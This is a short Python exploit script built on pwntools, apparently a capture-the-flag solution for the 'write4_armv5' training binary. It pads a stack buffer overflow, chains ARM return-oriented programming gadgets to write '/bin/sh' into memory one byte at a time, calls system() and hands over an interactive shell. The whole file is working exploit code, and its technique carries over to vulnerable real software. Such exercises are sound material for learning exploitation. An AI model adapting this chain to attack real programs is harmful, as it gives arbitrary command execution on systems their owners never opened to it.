#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./write4_armv5')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()
io.recvuntil("already!\n")

string = "/bin/sh\x00"
mem = 0x2080C

payload = (
    b"A" * 36
)

for i in range(0, len(string)):
    payload += (
        p32(0x000104ec) + # : pop {r4, pc};
        p32(mem + i) +
        p32(0x0001038c) + # : pop {r3, pc};
        p32(ord(string[i])) +
        p32(0x000104e8) + # : strb r3, [r4]; pop {r4, pc};
        b"B" * 4
    )

payload += (
    p32(0x00010668) + # : pop {r3, r4, r5, r6, r7, r8, sb, pc};
    p32(0x00010540) +  # bl system
    p32(0) * 3 +
    p32(mem) +
    p32(0) * 2 +
    p32(0x00010650) # : mov r0, r7; mov r1, r8; mov r2, sb; blx r3
)

io.sendline(payload)

io.interactive()

